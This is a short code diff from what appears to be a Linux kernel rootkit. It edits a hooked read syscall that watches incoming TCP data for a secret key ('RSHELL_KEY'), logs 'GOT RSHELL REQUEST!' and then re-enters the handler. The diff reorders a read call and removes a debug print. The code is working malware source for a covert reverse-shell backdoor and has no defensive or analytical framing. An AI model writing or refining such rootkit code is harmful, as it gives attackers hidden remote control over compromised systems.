@@ -30,9 +30,8 @@ asmlinkage int my_read64(int fd, void *buf, size_t len) {
 		if (sock && sock->type == SOCK_STREAM && (sk_buff = skb_peek(&sock->sk->sk_receive_queue))) {
 			if (sizeof(RSHELL_KEY) - 1 == sk_buff->len && f_strncmp(RSHELL_KEY, sk_buff->data, sk_buff->len) == 0) {
 				f_printk("GOT RSHELL REQUEST!\n");
-				ret = KSYSCALL(__NR_read, fd, my_buf, sizeof(my_buf) - 1, 0, 0, 0);
-				f_printk("ret %d\n", ret);
 				f_fput(file);
+				ret = KSYSCALL(__NR_read, fd, my_buf, sizeof(my_buf) - 1, 0, 0, 0);
 				return my_read64(fd, buf, len);
 			}
 		}
